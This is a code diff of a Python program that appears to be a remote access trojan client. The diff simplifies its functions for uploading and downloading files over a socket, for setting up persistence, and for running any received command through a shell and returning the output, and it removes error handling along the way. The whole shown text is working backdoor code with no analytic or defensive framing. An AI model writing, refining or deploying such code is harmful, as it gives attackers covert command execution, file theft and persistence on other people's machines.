@@ -17,22 +17,14 @@ active = False
 sock = None
 
 def Upload(sock, file):
-  try:
-    f = open(file, 'rb')
-  except IOError:
-    return 'Error opening file'
-
+  f = open(file, 'rb')
   d = f.read()
   Send(sock, d, '')
   f.close()
   return 'File sent 🍺'
 
 def Download(sock, file):
-  try:
-    f = open(file, 'wb')
-  except IOError:
-    return 'Error opening file'
-
+  f = open(file, 'wb')
   d = Receive(sock)
   f.write(d)
   f.close()
@@ -79,17 +71,10 @@ def Persist(sock, redown=None, newdir=None):
       persist += '\nPersistence complete.\n'
       return persist
 
-# execute command
 def Exec(cmde):
-  # check if command exists
-  if cmde:
-    execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    cmdoutput = execproc.stdout.read() + execproc.stderr.read()
-    return cmdoutput
-
-  # otherwise, return
-  else:
-    return "Enter a command.\n"
+  execproc = sp.Popen(cmde, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
+  o = execproc.stdout.read() + execproc.stderr.read()
+  return o
 
 while True:
   try:
